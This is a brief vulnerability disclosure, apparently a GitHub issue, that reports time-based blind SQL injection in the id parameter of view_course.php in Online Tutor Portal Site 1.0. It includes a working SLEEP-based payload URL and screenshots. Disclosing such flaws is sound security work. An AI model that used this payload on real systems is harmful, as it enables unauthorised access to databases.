## SQL injection vulnerability exists in online tutor portal system

## Vulnerability author:wanglun

supplier:
https://www.sourcecodester.com/php/15339/online-tutor-portal-site-phpopp-free-source-code.html

edition: 
1.0

/view_course.php

The Id parameter has SQL injection. Procedure

Payload: http://localhost:80/otps/tutor/courses/view_course.php?id=2' AND (SELECT 6101 FROM (SELECT(SLEEP(5)))lnqT) AND 'uigL'='uigL

![image](https://github.com/user-attachments/assets/11aa6962-5dcf-4af2-9e8f-8a34cfc961d0)

![image](https://github.com/user-attachments/assets/9487ef45-da16-4d35-a614-2879af1e6a98)

